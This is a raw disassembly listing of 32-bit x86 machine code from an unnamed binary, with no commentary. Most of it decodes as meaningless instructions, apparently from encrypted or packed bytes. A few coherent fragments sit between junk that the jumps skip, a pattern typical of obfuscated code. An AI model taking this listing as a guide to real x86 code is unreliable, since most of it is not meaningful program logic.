  40cf3d:	dec    eax
  40cf3e:	ins    DWORD PTR es:[edi],dx
  40cf3f:	scas   al,BYTE PTR es:[edi]
  40cf40:	addr16 jp 0x40cf8e
  40cf43:	push   es
  40cf44:	mov    edi,0x89bec800
  40cf49:	out    dx,eax
  40cf4a:	xlat   BYTE PTR ds:[ebx]
  40cf4b:	das    
  40cf4c:	sahf   
  40cf4d:	push   0xfffffffd
  40cf4f:	in     eax,dx
  40cf50:	inc    ebx
  40cf51:	retf   0xbfe0
  40cf54:	sbb    ebp,DWORD PTR [edi-0x7dc4bf98]
  40cf5a:	sbb    ebp,edx
  40cf5c:	repz fiadd DWORD PTR [ebx+0x40ce3902]
  40cf63:	sub    BYTE PTR [ecx+0x638b7ddf],0xac
  40cf6a:	cmp    cl,dh
  40cf6c:	push   esp
  40cf6d:	jns    0x40cf36
  40cf6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf70:	pop    ss
  40cf71:	sbb    DWORD PTR [edi+0x36],ebp
  40cf74:	pop    eax
  40cf75:	push   ebp
  40cf76:	jle    0x40cf14
  40cf78:	fmul   st,st(3)
  40cf7a:	jl     0x40cf5d
  40cf7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf7d:	add    eax,0x3423d30c
  40cf82:	fs cmp eax,0x85edde42
  40cf88:	pop    ebx
  40cf89:	(bad)  
  40cf8a:	outs   dx,BYTE PTR ds:[esi]
  40cf8b:	or     DWORD PTR [ecx],0x4f
  40cf8e:	pop    ss
  40cf8f:	sub    edi,edx
  40cf91:	int    0x4f
  40cf93:	or     DWORD PTR [esi+0x79],ecx
  40cf96:	pop    edx
  40cf97:	pop    es
  40cf98:	loope  0x40cfc2
  40cf9a:	pop    edi
  40cf9b:	cmp    BYTE PTR [ecx-0x27bb43d9],cl
  40cfa1:	inc    edx
  40cfa2:	add    ecx,DWORD PTR [edx]
  40cfa4:	ins    DWORD PTR es:[edi],dx
  40cfa5:	sar    DWORD PTR [ebx+0x1],0x49
  40cfa9:	aad    0x3
  40cfab:	jb     0x40cff7
  40cfad:	pop    ds
  40cfae:	pop    esi
  40cfaf:	loope  0x40cf7a
  40cfb1:	mov    ah,0x65
  40cfb3:	cli    
  40cfb4:	push   eax
  40cfb5:	rol    DWORD PTR [edi+0x2f85e838],1
  40cfbb:	push   0x8b0fc2a8
  40cfc0:	and    BYTE PTR [edx],0x7f
  40cfc3:	mov    eax,0xa5e1aed5
  40cfc8:	std    
  40cfc9:	loop   0x40cf7f
  40cfcb:	jle    0x40cfc3
  40cfcd:	mov    ds:0x24b5177e,al
  40cfd2:	jno    0x40cfbb
  40cfd4:	icebp  
  40cfd5:	jl     0x40d00c
  40cfd7:	cwde   
  40cfd8:	cmp    eax,0xdf7fd84a
  40cfdd:	mov    dh,0xfb
  40cfdf:	dec    ecx
  40cfe0:	mov    edi,0x44d277e1
  40cfe5:	outs   dx,DWORD PTR ds:[esi]
  40cfe6:	or     eax,ecx
  40cfe8:	mov    ch,0xb3
  40cfea:	xor    eax,DWORD PTR [edx+edi*4+0x4f]
  40cfee:	add    ebx,0x7093d8bd
  40cff4:	lea    bx,[eax-0x7c3876ad]
  40cffb:	mov    ecx,0x7aecc331
  40d000:	inc    ebx
  40d001:	ja     0x40d027
  40d003:	mov    ah,0x7a
  40d005:	mov    esp,0xb92234c5
  40d00a:	jp     0x40cfbb
  40d00c:	cmp    ebp,ebx
  40d00e:	shl    edx,0x16
  40d011:	inc    ecx
  40d012:	adc    BYTE PTR [ebp+0x53e8fb51],dl
  40d018:	scas   al,BYTE PTR es:[edi]
  40d019:	push   esi
  40d01a:	mov    al,ds:0x8f7a307a
  40d01f:	aad    0x27
  40d021:	outs   dx,DWORD PTR ds:[esi]
  40d022:	cdq    
  40d023:	or     DWORD PTR ds:0xbbc9de75,esi
  40d029:	int    0x38
  40d02b:	test   ch,bh
  40d02d:	mov    BYTE PTR ds:0xcf4c91c,ah
  40d033:	pop    esp
  40d034:	inc    ebx
  40d035:	daa    
  40d036:	mov    bl,0x36
  40d038:	xchg   ebp,eax
  40d039:	jbe    0x40d016
  40d03b:	(bad)  [edi+0x6fe850fc]
  40d041:	idiv   BYTE PTR [edx+ebx*4+0x6d03353b]
  40d048:	sub    esp,ebx
  40d04a:	ins    BYTE PTR es:[edi],dx
  40d04b:	sub    ecx,esp
  40d04d:	mov    ah,0x45
  40d04f:	mov    ecx,0xad4062f8
  40d054:	not    DWORD PTR [edi]
  40d056:	ret    
  40d057:	and    cl,bh
  40d059:	inc    ecx
  40d05a:	ror    BYTE PTR [edx-0x6b],cl
  40d05d:	mov    cl,0xc8
  40d05f:	inc    ebx
  40d060:	add    edx,DWORD PTR [edx]
  40d062:	xor    al,0xc5
  40d064:	mov    esp,0x29fe6114
  40d069:	mov    eax,ds:0x4dd1e1a
  40d06e:	pop    edx
  40d06f:	and    DWORD PTR [edx-0x65],0xfffffff5
  40d073:	or     BYTE PTR [edi-0x66],0x3f
  40d077:	sbb    eax,DWORD PTR [edx+0x3e673b1c]
  40d07d:	repz ja 0x40d0e7
  40d080:	add    dh,BYTE PTR gs:[edx+0x6856ed98]
  40d087:	(bad)  
  40d088:	push   ebp
  40d089:	nop
  40d08a:	loope  0x40d03a
  40d08c:	inc    esi
  40d08d:	pusha  
  40d08e:	mov    WORD PTR [ebp+0x73],?
  40d091:	ins    BYTE PTR es:[edi],dx
  40d092:	mov    ch,0x4a
  40d094:	dec    edi
  40d095:	idiv   BYTE PTR [eax]
  40d097:	sub    al,0x9a
  40d099:	adc    ecx,DWORD PTR [ecx+0x44b04054]
  40d09f:	pop    ss
  40d0a0:	mov    ds:0x6594aa3c,eax
  40d0a5:	push   ds
  40d0a6:	push   esi
  40d0a7:	stc    
  40d0a8:	lods   al,BYTE PTR ds:[esi]
  40d0a9:	dec    eax
  40d0aa:	mov    eax,0x3d7a0be4
  40d0af:	mov    esi,0xc9aa34bd
  40d0b4:	jbe    0x40d037
  40d0b6:	inc    edx
  40d0b7:	jecxz  0x40d08e
  40d0b9:	fst    DWORD PTR [eax+0x5f6166fd]
  40d0bf:	test   edx,ebp
  40d0c1:	add    al,BYTE PTR [ebx-0xf9979f1]
  40d0c7:	(bad)  
  40d0c8:	dec    DWORD PTR [ebx+0x7d8bf455]
  40d0ce:	fdiv   QWORD PTR [ebx]
  40d0d0:	rol    BYTE PTR [ebx],1
  40d0d2:	ror    DWORD PTR [edi],1
  40d0d4:	scas   eax,DWORD PTR es:[edi]
  40d0d5:	xlat   BYTE PTR ds:[ebx]
  40d0d6:	mov    edi,DWORD PTR [ebp-0x18]
  40d0d9:	xor    edi,eax
  40d0db:	add    edx,edi
  40d0dd:	jmp    0x40d49b
  40d0e2:	xor    ah,BYTE PTR [edi+ecx*8]
  40d0e5:	out    0xcd,al
  40d0e7:	icebp  
  40d0e8:	xor    esp,esi
  40d0ea:	cmp    al,0x59
  40d0ec:	lods   al,BYTE PTR ds:[esi]
  40d0ed:	les    ebx,FWORD PTR [ebx]
  40d0ef:	shl    BYTE PTR [esi+0x48],1
  40d0f2:	stos   BYTE PTR es:[edi],al
  40d0f3:	popf   
  40d0f4:	jo     0x40d166
  40d0f6:	lahf   
  40d0f7:	jge    0x40d169
  40d0f9:	jo     0x40d14b
  40d0fb:	cld    
  40d0fc:	and    edi,DWORD PTR [edi+0x389172ba]
  40d102:	loope  0x40d155
  40d104:	jp     0x40d0d0
  40d106:	stc    
  40d107:	push   edi
  40d108:	push   0xffffffb8
  40d10a:	mov    ah,0x6b
  40d10c:	xor    eax,0x6f841376
  40d111:	scas   eax,DWORD PTR es:[edi]
  40d112:	jmp    0xf49:0xbd0d0cad
  40d119:	adc    DWORD PTR [edi+0xc],ecx
  40d11c:	xchg   DWORD PTR [eax-0x56b85fe1],ebp
  40d122:	and    BYTE PTR [esi],dh
  40d124:	cmp    DWORD PTR [edi-0x1b7855d4],esi
  40d12a:	dec    ecx
  40d12b:	push   cs
  40d12c:	sahf   
  40d12d:	and    al,ah
  40d12f:	mov    cl,0xe7
  40d131:	dec    eax
  40d132:	dec    BYTE PTR [edi]
  40d134:	clc    
  40d135:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d136:	sbb    BYTE PTR [edx-0x30],dh
  40d139:	fnstenv [edx-0x2149064e]
  40d13f:	cli    
  40d140:	aad    0x19
  40d142:	shr    BYTE PTR [edx+0x41fd5f72],1
  40d148:	jp     0x40d142
  40d14a:	add    esp,ebp
  40d14c:	inc    ecx
  40d14d:	popf   
  40d14e:	cs aaa 
  40d150:	jle    0x40d17d
  40d152:	repnz retf 0x15e2
  40d156:	sbb    dl,BYTE PTR [ebx]
  40d158:	push   ebx
  40d159:	push   cs
  40d15a:	rcr    esi,cl
  40d15c:	adc    bl,BYTE PTR [ecx+edx*8]
  40d15f:	inc    esp
  40d160:	int3   
  40d161:	popw   ds
  40d163:	add    esp,0x6e
  40d166:	fmul   st(1),st
  40d168:	iret   
  40d169:	push   cs
  40d16a:	push   0x97772540
  40d16f:	fdiv   QWORD PTR [ebx]
  40d171:	ret    
  40d172:	sbb    al,0x5d
  40d174:	dec    esp
  40d175:	aam    0xf0
  40d177:	inc    ebx
  40d178:	mov    ecx,0xb00f34b5
  40d17d:	call   0x3c70:0x7063b5c
  40d184:	sar    DWORD PTR [edi-0x68],1
  40d187:	mov    esp,0x7a017882
  40d18c:	xchg   ebx,eax
  40d18d:	dec    ebx
  40d18e:	adc    BYTE PTR [ebx-0x55],al
  40d191:	dec    eax
  40d192:	(bad)  
  40d193:	retf   0x700d
  40d196:	sub    eax,0x3cd9756b
  40d19b:	cld    
  40d19c:	mov    al,0xcb
  40d19e:	jnp    0x40d1a6
  40d1a0:	and    DWORD PTR [esi-0x2d2cb4d4],eax
  40d1a6:	jmp    0x79ff:0x7241d779
  40d1ad:	mov    ds:0x5ad0cb45,al
  40d1b2:	adc    esp,esp
  40d1b4:	loope  0x40d163
  40d1b6:	stos   DWORD PTR es:[edi],eax
  40d1b7:	cmp    DWORD PTR [edi+eiz*2-0x6b431b32],0xb927a571
  40d1c2:	xor    al,0x40
  40d1c4:	loop   0x40d16d
  40d1c6:	out    0x99,al
  40d1c8:	lds    esi,FWORD PTR [ebp+0x66]
  40d1cb:	int3   
  40d1cc:	call   0xb06f740f
  40d1d1:	(bad)  
  40d1d2:	std    
  40d1d3:	shl    DWORD PTR [ebx],0xb8
  40d1d6:	icebp  
  40d1d7:	call   FWORD PTR [ecx+0x6834c178]
  40d1dd:	mov    dl,0x95
  40d1df:	inc    edi
  40d1e0:	or     bh,ch
  40d1e2:	popf   
  40d1e3:	mov    ebp,0x2c212aa2
  40d1e8:	jl     0x40d1dd
  40d1ea:	sbb    bh,dh
  40d1ec:	in     al,0x44
  40d1ee:	repz fist WORD PTR [ecx-0x41808403]
  40d1f5:	(bad)  
  40d1f6:	dec    esi
  40d1f7:	or     DWORD PTR [eax-0x29],0xbf3f38f2
  40d1fe:	pop    edi
  40d1ff:	mov    ch,0x63
  40d201:	test   eax,0xe631dc3f
  40d206:	fwait
  40d207:	rcl    DWORD PTR [esi-0x406afe1],cl
  40d20d:	out    0x75,al
  40d20f:	pop    esp
  40d210:	loopne 0x40d252
  40d212:	xor    DWORD PTR [edx],ecx
  40d214:	lods   eax,DWORD PTR ds:[esi]
  40d215:	int    0x5d
  40d217:	imul   ebx,esi,0x6c
  40d21a:	xor    BYTE PTR [ecx+0x1a],ah
  40d21d:	and    eax,0x6a710ff7
  40d222:	cmp    ebx,esp
  40d224:	out    0x23,al
  40d226:	inc    esp
  40d227:	fcmovnbe st,st(2)
  40d229:	sbb    BYTE PTR [edx],ah
  40d22b:	aam    0xe3
  40d22d:	xchg   edx,eax
  40d22e:	xor    dl,BYTE PTR [ebx+0x38c64d1c]
  40d234:	xchg   BYTE PTR [ebp-0x19],dl
  40d237:	ficom  DWORD PTR [edx-0x37f4300f]
  40d23d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d23e:	nop
  40d23f:	add    cl,bl
  40d241:	add    bh,BYTE PTR [eax]
  40d243:	cmp    eax,0xb376de15
  40d248:	and    bl,BYTE PTR [ecx]
  40d24a:	ds dec ebp
  40d24c:	shr    BYTE PTR [ebx+0x19263ee8],cl
  40d252:	mov    ecx,0xa3d3135e
  40d257:	jl     0x40d28b
  40d259:	gs xor edi,0xdd0e75f4
  40d260:	add    BYTE PTR [edx+esi*2-0x3686896d],cl
  40d267:	rol    DWORD PTR [eax+0x1571b1ac],1
  40d26d:	xchg   ecx,eax
  40d26e:	dec    esp
  40d26f:	mov    ds:0x269f0861,eax
  40d274:	sbb    BYTE PTR ds:0x332a1ae5,dl
  40d27a:	sbb    eax,0x464be60f
  40d27f:	xchg   BYTE PTR [esi+0x22],ah
  40d282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d283:	xchg   edi,eax
  40d284:	push   esi
  40d285:	dec    esp
  40d286:	sbb    DWORD PTR [edx],esp
  40d288:	leave  
  40d289:	fs jl  0x40d2a5
  40d28c:	lds    edi,FWORD PTR [edi+0x4d87a0ae]
  40d292:	setns  BYTE PTR [ecx]
  40d295:	into   
  40d296:	xchg   DWORD PTR [ebp-0x239300ba],edi
  40d29c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d29d:	ins    DWORD PTR es:[edi],dx
  40d29e:	out    dx,eax
  40d29f:	enter  0xa1d7,0xfd
  40d2a3:	ins    BYTE PTR es:[edi],dx
  40d2a4:	push   esi
  40d2a5:	repz jg 0x40d22d
  40d2a8:	mov    bl,0x92
  40d2aa:	xchg   ebp,eax
  40d2ab:	sub    DWORD PTR [ecx+0x32],edx
  40d2ae:	push   ds
  40d2af:	push   eax
  40d2b0:	sbb    al,0x1a
  40d2b2:	jle    0x40d27f
  40d2b4:	xchg   edx,eax
  40d2b5:	mov    cl,0x19
  40d2b7:	rol    BYTE PTR ds:0xeca3b9f0,0xc8
  40d2be:	sar    BYTE PTR [ebx-0x27],0x14
  40d2c2:	aaa    
  40d2c3:	mov    al,ds:0x808a2a79
  40d2c8:	ret    0xa9cb
  40d2cb:	cld    
  40d2cc:	sbb    al,0xb0
  40d2ce:	or     edx,DWORD PTR [edi+0x160e7281]
  40d2d4:	enter  0x5031,0xa7
  40d2d8:	sbb    eax,0x7d645945
  40d2dd:	pop    esi
  40d2de:	mov    dl,BYTE PTR [eax]
  40d2e0:	dec    BYTE PTR [esi]
  40d2e2:	sub    al,0xe9
  40d2e5:	out    0xb,al
  40d2e7:	js     0x40d2ec
  40d2e9:	cmp    ebp,DWORD PTR [ecx+0xb]
  40d2ec:	push   0xffffffad
  40d2ee:	jmp    0x6a2b:0x48e21a8d
  40d2f5:	retf   0xfdff
  40d2f8:	mov    esi,0xb708926
  40d2fd:	push   ebx
  40d2fe:	out    dx,al
  40d2ff:	dec    ebp
  40d300:	xchg   ebx,eax
  40d301:	fild   QWORD PTR [eax-0x1576c6ae]
  40d307:	pusha  
  40d308:	push   ds
  40d309:	or     BYTE PTR [ebp+0x42643908],0x58
  40d310:	xor    dl,BYTE PTR [eax]
  40d312:	out    dx,al
  40d313:	mov    ch,0x50
  40d315:	(bad)
  40d318:	pushf  
  40d319:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d31a:	in     eax,0xfe
  40d31c:	jne    0x40d2ce
  40d31e:	jecxz  0x40d38a
  40d320:	test   eax,0x5d7a3eab
  40d325:	sub    al,bl
  40d327:	and    DWORD PTR [ecx+0x3e],eax
  40d32a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d32b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d32c:	adc    al,0x64
  40d32e:	jb     0x40d391
  40d330:	test   eax,0x6baf0c7d
  40d335:	mov    dh,0x67
  40d337:	add    esp,edx
  40d339:	jl     0x40d383
  40d33b:	fwait
  40d33c:	pop    eax
  40d33d:	mov    esi,0xf3ea7246
  40d342:	(bad)  
  40d343:	cmp    eax,0x8b1e355
  40d348:	mov    BYTE PTR [eax],al
  40d34a:	fst    QWORD PTR [ecx+0x58edac65]
  40d350:	sbb    al,0x97
  40d352:	cmp    bh,ah
  40d354:	sbb    edx,DWORD PTR [eax+0x76]
  40d357:	aam    0xa5
  40d359:	call   0xd3b2:0xa5108dd
  40d360:	jbe    0x40d32f
  40d362:	mov    dl,0x4b
  40d364:	sbb    eax,0x69385ec6
  40d369:	mov    eax,0x4f90a6b2
  40d36e:	or     BYTE PTR [edx],bh
  40d370:	add    al,0xbc
  40d372:	pusha  
  40d373:	dec    eax
  40d374:	dec    eax
  40d375:	fstp   QWORD PTR [edi+0x1d]
  40d378:	in     eax,dx
  40d379:	xor    al,0x9a
  40d37b:	mov    dh,0x8
  40d37d:	lahf   
  40d37e:	aas    
  40d37f:	or     DWORD PTR [ebp+0x489803ae],0xffffffa0
  40d386:	mov    bh,0x6c
  40d388:	jmp    0xdb03:0x181338e5
  40d38f:	cdq    
  40d390:	inc    ebp
  40d391:	xchg   cl,dl
  40d393:	aaa    
  40d394:	rcl    DWORD PTR [ebx+0x13],cl
  40d397:	icebp  
  40d398:	loopne 0x40d396
  40d39a:	mov    esp,0xabed235
  40d39f:	stc    
  40d3a0:	inc    ecx
  40d3a1:	pop    ds
  40d3a2:	dec    edx
  40d3a3:	test   al,0x5d
  40d3a5:	lods   eax,DWORD PTR ds:[esi]
  40d3a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3a7:	int    0x5f
  40d3a9:	dec    edx
  40d3aa:	in     eax,0xa5
  40d3ac:	push   es
  40d3ad:	dec    edx
  40d3ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3af:	dec    esi
  40d3b0:	push   cs
  40d3b1:	push   ebp
  40d3b2:	jne    0x40d3b0
  40d3b4:	dec    BYTE PTR [ecx+0xf0d1165]
  40d3ba:	stos   BYTE PTR es:[edi],al
  40d3bb:	jae    0x40d368
  40d3bd:	sub    eax,0x53cfb6a
  40d3c2:	stc    
  40d3c3:	or     esp,esi
  40d3c5:	mov    dh,0x6d
  40d3c7:	dec    edi
  40d3c8:	fsub   QWORD PTR [edi-0x1dfd5583]
  40d3ce:	xchg   BYTE PTR [esi],cl
  40d3d0:	sbb    DWORD PTR [eax],eax
  40d3d2:	cli    
  40d3d3:	nop
  40d3d4:	mov    eax,ds:0x73b11135
  40d3d9:	xchg   edi,eax
  40d3da:	xchg   ebp,eax
  40d3db:	jbe    0x40d36a
  40d3dd:	mov    al,0x5b
  40d3df:	jae    0x40d3a9
  40d3e1:	fmul   DWORD PTR [edi-0x59de2b78]
  40d3e7:	inc    edx
  40d3e8:	dec    edi
  40d3e9:	pop    esp
  40d3ea:	in     al,0x52
  40d3ec:	pop    ecx
  40d3ed:	dec    ebp
  40d3ee:	sbb    bl,bh
  40d3f0:	dec    esi
  40d3f1:	imul   eax,DWORD PTR [ebx+0x2d],0x396a9ec2
  40d3f8:	pop    eax
  40d3f9:	xor    eax,0x18521263
  40d3fe:	inc    esi
  40d3ff:	push   edi
  40d400:	cmp    al,BYTE PTR [edi]
  40d402:	outs   dx,BYTE PTR ds:[esi]
  40d403:	or     eax,DWORD PTR [edx-0x71]
  40d406:	mov    bl,0x3b
  40d408:	out    0x78,al
  40d40a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d40b:	pop    edx
  40d40c:	aad    0xa0
  40d40e:	(bad)  
  40d40f:	dec    esi
  40d410:	jbe    0x40d473
  40d412:	pop    es
  40d413:	in     al,dx
  40d414:	xor    DWORD PTR [edi+0x5b],esi
  40d417:	pop    eax
  40d418:	sbb    ebx,DWORD PTR [esi+ecx*2]
  40d41b:	pop    es
  40d41c:	out    dx,al
  40d41d:	imul   ebx,DWORD PTR [edx-0x58],0xe492bc46
  40d424:	mov    ds:0x717e556a,al
  40d429:	mov    eax,ds:0xbf02e697
  40d42e:	fsub   DWORD PTR [eax+0x220c1728]
  40d434:	add    DWORD PTR [edx+0x50dbe3ed],esp
  40d43a:	cli    
  40d43b:	mov    al,0xe5
  40d43d:	dec    esp
  40d43e:	(bad)  
  40d43f:	adc    BYTE PTR [edx*1-0x3626e301],dh
  40d446:	jne    0x40d4b1
  40d448:	neg    bl
  40d44a:	or     al,BYTE PTR [edx]
  40d44c:	xchg   edi,eax
  40d44d:	and    al,0x90
  40d44f:	jg     0x40d468
  40d451:	adc    eax,DWORD PTR [ebp+0x7c3b47e7]
  40d457:	pop    edx
  40d458:	lds    ebx,FWORD PTR [eax-0x783c6dd1]
  40d45e:	or     bh,dl
  40d460:	retf   0xbc6
  40d463:	test   eax,esp
  40d465:	inc    esp
  40d466:	fcom   st(3)
  40d468:	fcom   QWORD PTR [edx+0x4ee98708]
  40d46e:	mov    al,0x7a
  40d470:	ret    0x2599
  40d473:	xchg   ebx,eax
  40d474:	pusha  
  40d475:	aas    
  40d476:	xor    eax,0x8b20f478
  40d47b:	inc    ebp
  40d47c:	ds in  eax,dx
  40d47e:	pop    ecx
  40d47f:	pop    eax
  40d480:	mov    ds:0x20816e07,al
  40d485:	fisttp QWORD PTR [esi-0x59b8f06]
  40d48b:	rol    BYTE PTR [edx+0x2a],0x3a
  40d48f:	pop    ebp
  40d490:	mov    WORD PTR [ebx],ds
  40d492:	adc    eax,0x695e732c
  40d497:	xor    DWORD PTR [eax],edi
  40d499:	jns    0x40d514
  40d49b:	mov    edi,DWORD PTR [ebp-0x8]
  40d49e:	lea    edx,[edx+edi*1+0x32729c]
  40d4a5:	mov    DWORD PTR [ebp-0x8],edx
  40d4a8:	mov    edx,DWORD PTR [ebp-0x20]
  40d4ab:	xor    edx,eax
  40d4ad:	mov    edi,0xffcd8d64
  40d4b2:	sub    edi,edx
  40d4b4:	jmp    0x40d872
  40d4b9:	out    dx,al
  40d4ba:	inc    ebx
  40d4bb:	push   0x4e
  40d4bd:	jno    0x40d534
  40d4bf:	jmp    0xd3d3:0xb81a1d63
  40d4c6:	jbe    0x40d44c
  40d4c8:	push   ds
  40d4c9:	leave  
  40d4ca:	cdq    
  40d4cb:	jo     0x40d53d
  40d4cd:	lahf   
  40d4ce:	jge    0x40d540
  40d4d0:	jo     0x40d542
  40d4d2:	cmc    
  40d4d3:	int    0x6c
  40d4d5:	cmp    eax,0x81a29000
  40d4da:	xchg   edx,eax
  40d4db:	mov    ebp,0x1b678a30
  40d4e0:	sar    DWORD PTR [ecx+0x7d],cl
  40d4e3:	stos   BYTE PTR es:[edi],al
  40d4e4:	loopne 0x40d546
  40d4e6:	xchg   esi,eax
  40d4e7:	(bad)  
  40d4e8:	cmp    eax,edx
  40d4ea:	push   edx
  40d4eb:	or     ebx,DWORD PTR [edx-0x28]
  40d4ee:	mov    ch,BYTE PTR [ecx+esi*4]
  40d4f1:	sbb    dl,ch
  40d4f3:	aaa    
  40d4f4:	pop    ebx
  40d4f5:	inc    eax
  40d4f6:	sahf   
  40d4f7:	xchg   BYTE PTR [ebp+0x5],ah
  40d4fa:	xor    eax,0x8e9b5e3b
  40d4ff:	push   0x5a
  40d501:	popf   
  40d502:	pop    ebx
  40d503:	bound  edi,QWORD PTR [edx]
  40d505:	int    0x52
  40d507:	or     eax,0x6c2505d5
  40d50c:	mov    ecx,0x14ce3919
  40d511:	xlat   BYTE PTR ds:[ebx]
  40d512:	dec    ecx
  40d513:	xchg   ecx,eax
  40d514:	mov    esi,0x89b868f3
  40d519:	jecxz  0x40d568
  40d51b:	aas    
  40d51c:	xor    ebp,edi
  40d51e:	gs sbb al,0x6e
  40d521:	aam    0xdd
  40d523:	mov    bl,0x17
  40d525:	jge    0x40d543
  40d527:	call   0x4fb23830
  40d52c:	and    al,0xa5
  40d52e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d52f:	push   cs
  40d530:	cmp    edx,DWORD PTR [edi]
  40d532:	scas   al,BYTE PTR es:[edi]
  40d533:	cdq    
  40d534:	ins    BYTE PTR es:[edi],dx
  40d535:	inc    ebp
  40d536:	jle    0x40d58c
  40d538:	mov    ds:0x1668c95c,eax
  40d53d:	js     0x40d5af
  40d53f:	mov    eax,ds:0xdcd5b082
  40d544:	rcr    ebx,0x34
  40d547:	daa    
  40d548:	popf   
  40d549:	xchg   ebp,eax
  40d54a:	jmp    0x40d532
  40d54c:	out    0x3e,eax
  40d54e:	imul   ecx,DWORD PTR [edi-0x5b027754],0xb7d709e8
  40d558:	stc    
  40d559:	(bad)  
  40d55a:	jmp    0xaca0fba
  40d55f:	jnp    0x40d59f
  40d561:	fwait
  40d562:	mov    esi,0xe88f2c1b
  40d567:	dec    ebx
  40d568:	ja     0x40d5da
  40d56a:	sub    eax,ebx
  40d56c:	aam    0x42
  40d56e:	ja     0x40d598
  40d570:	and    esp,DWORD PTR [eax]
  40d572:	fisubr WORD PTR [esi+0x5bb2b0bf]
  40d578:	xchg   BYTE PTR [ecx-0x538e5954],ch
  40d57e:	mov    cl,0xbe
  40d580:	jecxz  0x40d5e4
  40d582:	cli    
  40d583:	aam    0xc4
  40d585:	mov    bh,0x93
  40d587:	leave  
  40d588:	mov    cl,0x7e
  40d58a:	sbb    BYTE PTR ds:0x2ee1d9db,0x49
  40d591:	and    DWORD PTR [ecx-0x63],edx
  40d594:	in     al,0xf4
  40d596:	lahf   
  40d597:	mov    WORD PTR [ebx*1-0x10bfb3fd],cs
  40d59e:	add    BYTE PTR [esi-0x61],cl
  40d5a1:	shl    BYTE PTR [esi+0x6a],0xa1
  40d5a5:	add    DWORD PTR [esi+0x78],ecx
  40d5a8:	pushf  
  40d5a9:	mov    ebx,esp
  40d5ab:	xor    eax,0x75790db2
  40d5b0:	ret    
  40d5b1:	jmp    0x40d5d9
  40d5b3:	in     eax,0x41
  40d5b5:	jl     0x40d5c5
  40d5b7:	frstor [ebp+0x5bd1fdc1]
  40d5bd:	push   ss
  40d5be:	jl     0x40d62c
  40d5c0:	xlat   BYTE PTR ds:[ebx]
  40d5c1:	in     al,0x2d
  40d5c3:	xchg   esi,eax
  40d5c4:	int    0xc1
  40d5c6:	mov    ds:0x1ca7c92a,eax
  40d5cb:	(bad)  
  40d5cc:	xlat   BYTE PTR ds:[ebx]
  40d5cd:	mov    esi,0x6bc89696
  40d5d2:	hlt    
  40d5d3:	mov    eax,ds:0xa388217c
  40d5d8:	lods   eax,DWORD PTR ds:[esi]
  40d5d9:	pop    ebp
  40d5da:	pop    ss
  40d5db:	popf   
  40d5dc:	loope  0x40d560
  40d5de:	adc    ebx,eax
  40d5e0:	and    BYTE PTR [ecx+0x498029c7],cl
  40d5e6:	or     eax,0x8234115d
  40d5eb:	fdiv   DWORD PTR [eax-0x1d]
  40d5ee:	push   0xc128e879
  40d5f3:	fwait
  40d5f4:	pop    ebp
  40d5f5:	arpl   WORD PTR [ebx-0x5c3aab0],sp
  40d5fb:	mov    eax,ds
  40d5fd:	mov    esp,0x238504b7
  40d602:	or     ebp,DWORD PTR [esi+0x1f]
  40d605:	mov    ebx,0x817c51f9
  40d60a:	call   0x46d057dd
  40d60f:	std    
  40d610:	in     al,0x5a
  40d612:	and    DWORD PTR [ebx],eax
  40d614:	test   DWORD PTR [ecx-0x4a283e64],eax
  40d61a:	sub    eax,0x7178990c
  40d61f:	mov    ds:0xd808a4a1,eax
  40d624:	popf   
  40d625:	jae    0x40d5b7
  40d627:	or     eax,0x6ac286a5
  40d62c:	aaa    
  40d62d:	jne    0x40d64c
  40d62f:	pushf  
  40d630:	std    
  40d631:	or     DWORD PTR [ecx],0xffffff9c
  40d634:	loope  0x40d6a2
  40d636:	je     0x40d5df
  40d638:	push   eax
  40d639:	jae    0x40d629
  40d63b:	jmp    0x40d5ec
  40d63d:	xchg   esp,eax
  40d63e:	adc    eax,0x1895815e
  40d643:	sbb    BYTE PTR [ebp+0x5c8ba793],dh
  40d649:	mov    DWORD PTR [ebx-0x31],esp
  40d64c:	jb     0x40d640
  40d64e:	je     0x40d6c8
  40d650:	(bad)  
  40d651:	mov    ds:0x18dfa0c9,al
  40d656:	loopne 0x40d5ef
  40d658:	adc    BYTE PTR [ebx-0x60],bl
  40d65b:	stc    
  40d65c:	lea    eax,[esi+0x22f9010e]
  40d662:	aas    
  40d663:	das    
  40d664:	test   eax,0xc15d3939
  40d669:	inc    eax
  40d66a:	popf   
  40d66b:	push   edi
  40d66c:	(bad)  
  40d66d:	dec    esp
  40d66e:	jae    0x40d648
  40d670:	in     eax,dx
  40d671:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d672:	or     DWORD PTR [esp+ebp*1-0x44],esi
  40d676:	lock xchg esp,eax
  40d678:	jbe    0x40d62b
  40d67a:	and    DWORD PTR [eax+ebp*2-0x5e4354e6],esp
  40d681:	js     0x40d681
  40d683:	imul   ebx,DWORD PTR [esi],0x21ceeecb
  40d689:	inc    ebp
  40d68a:	jp     0x40d6be
  40d68c:	or     eax,DWORD PTR [ebx-0x441ad76e]
  40d692:	ins    BYTE PTR es:[edi],dx
  40d693:	pop    edi
  40d694:	pop    edx
  40d695:	sbb    ch,BYTE PTR [ebx+0x33]
  40d698:	sub    DWORD PTR [edx-0x4940512b],ecx
  40d69e:	mov    al,BYTE PTR [ecx]
  40d6a0:	xor    bl,BYTE PTR ds:0xd4252792
  40d6a6:	retf   
  40d6a7:	adc    eax,0x48b7a26a
  40d6ac:	jl     0x40d6b5
  40d6ae:	mov    ah,0x12
  40d6b0:	push   ebp
  40d6b1:	addr16 (bad) 
  40d6b3:	loopne 0x40d653
  40d6b5:	loopne 0x40d6f0
  40d6b7:	adc    bl,bl
  40d6b9:	xchg   ebx,eax
  40d6ba:	leave  
  40d6bb:	fisubr DWORD PTR [esi]
  40d6bd:	aaa    
